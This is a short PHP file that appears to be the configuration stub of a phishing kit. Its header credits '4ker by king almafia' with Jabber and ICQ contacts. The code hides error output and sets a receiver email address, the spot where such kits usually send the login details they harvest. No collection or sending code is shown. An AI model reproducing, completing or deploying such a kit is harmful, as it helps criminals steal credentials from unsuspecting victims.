<?php
/*
 * 4ker by king almafia
 * Jabber: 	yoglive2@gmail.com
 * ICQ: almafia
 */
ini_set('display_errors', 0);
$receiverAddress = "stevenmurdoch@yandex.com";


?>